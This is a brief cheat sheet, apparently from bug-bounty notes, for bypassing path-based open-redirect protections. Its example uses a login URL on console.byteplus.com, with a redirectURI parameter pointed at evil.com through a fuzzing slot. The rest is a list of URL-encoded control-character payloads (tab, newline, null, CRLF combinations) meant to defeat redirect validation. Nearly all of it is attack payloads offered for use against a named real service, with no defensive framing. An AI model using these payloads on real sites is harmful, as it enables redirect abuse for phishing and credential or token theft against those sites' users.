### bypass path based redirect

if url look like
https://console.byteplus.com/auth/login/?redirectURI=%2Fwelcome

try
https://console.byteplus.com/auth/login/?redirectURI=/FUZZ/evil.com

### most working
```
%09
%0a
%00
%09%09
%0d%0a
%09%0d%0a
```

### all bypass
```
%0a
%0d
%0b
%0c
%1c
%1d
%1e
%1f
%20
%0A
%0D
%0B
%0C
%09
%20
%00
%0
%0'
/n
\n
%09
%09%09
%09%09%09
%09%09%09%09
%09%09%09%09%09
%09%09%09%09%09%09
%09%0a
%09%0d
%0d%0a
%0a%0d
%09%0d%0a
%0d%0a%09
%0a%09%0d
%09%09%0a
%09%09%0d
%09%0a%09
%20%09
%09%20
%20%0a
%0a%20
%00
%00%09
%00%0a
%00%0d
%09%00
%0a%00
%0d%00
%0d%0a%00
%00%0d%0a
```
